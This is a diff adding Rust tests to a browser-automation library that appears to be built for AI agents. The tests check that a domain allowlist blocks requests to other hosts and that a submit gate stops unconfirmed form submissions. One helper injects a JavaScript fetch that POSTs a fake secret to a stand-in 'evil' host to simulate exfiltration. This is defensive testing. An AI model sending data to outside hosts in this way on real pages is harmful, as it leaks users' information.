@@ -765,3 +765,81 @@ async fn secrets_do_not_come_back_through_reports_or_snapshots() {
     );
     b.close().await;
 }
+
+/// A page on an allowed host fires a request at a forbidden host. It must never arrive.
+async fn leak_attempt(policy: Policy) -> bool {
+    let srv = FixtureServer::start();
+    let b = Browser::launch(LaunchOptions::default(), policy)
+        .await
+        .unwrap();
+    // 127.0.0.1 is the allowed host; "localhost" is a different host that reaches the same server.
+    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+    let evil = srv.url("/submit").replace("127.0.0.1", "localhost");
+    b.page
+        .eval(&format!(
+            "fetch({evil:?},{{method:'POST',mode:'no-cors',headers:{{'content-type':'text/plain'}},body:JSON.stringify({{leak:'secret'}})}}).catch(()=>{{}})"
+        ))
+        .await
+        .unwrap();
+    tokio::time::sleep(Duration::from_millis(800)).await;
+    let arrived = srv.last().is_some();
+    b.close().await;
+    arrived
+}
+
+#[tokio::test]
+async fn allowlist_blocks_requests_to_other_hosts_at_the_network() {
+    if waymarker_cdp::find_chrome(None).is_err() {
+        return;
+    }
+    // Control: with no allowlist the request goes through, so the test can actually detect a leak.
+    assert!(
+        leak_attempt(Policy::default()).await,
+        "control failed: the request never arrived"
+    );
+    let restricted = leak_attempt(Policy {
+        allowed_domains: vec!["127.0.0.1".into()],
+        allow_file: false,
+    })
+    .await;
+    assert!(!restricted, "request to a forbidden host got through");
+}
+
+#[tokio::test]
+async fn submit_gate_blocks_every_path_except_a_confirmed_submit() {
+    let Some((srv, b)) = setup().await else {
+        return;
+    };
+    b.page.set_submit_gate(true).await.unwrap();
+    b.page.navigate(&srv.url("/basic.html")).await.unwrap();
+    b.page
+        .fill_form(
+            req(json!({"Full name": "Ada Lovelace", "email": "ada@example.com", "message": "Hello there"})),
+            None,
+        )
+        .await
+        .unwrap();
+    let ir = b.page.forms().await.unwrap();
+    let submit_ref = ir.forms[0].submit[0].r#ref.clone();
+
+    // Clicking the submit button directly, and pressing Enter in a field, both try to POST.
+    let out = b.page.click(&submit_ref).await.unwrap();
+    assert!(srv.last().is_none(), "click bypassed the gate");
+    assert!(
+        out.warnings
+            .iter()
+            .any(|w| w.contains("require-confirm-submit")),
+        "the agent must be told why nothing happened: {out:?}"
+    );
+    let name_ref = ir.forms[0].fields[0].r#ref.clone();
+    b.page.click(&name_ref).await.unwrap();
+    let _ = b.page.press("Enter").await;
+    tokio::time::sleep(Duration::from_millis(400)).await;
+    assert!(srv.last().is_none(), "Enter bypassed the gate");
+
+    // The confirmed path still works, on the same page the blocked attempts left intact.
+    let res = b.page.submit(None, None).await.unwrap();
+    assert_eq!(res.status, SubmitStatus::Submitted, "{res:#?}");
+    assert_eq!(srv.last().unwrap()["name"], "Ada Lovelace");
+    b.close().await;
+}
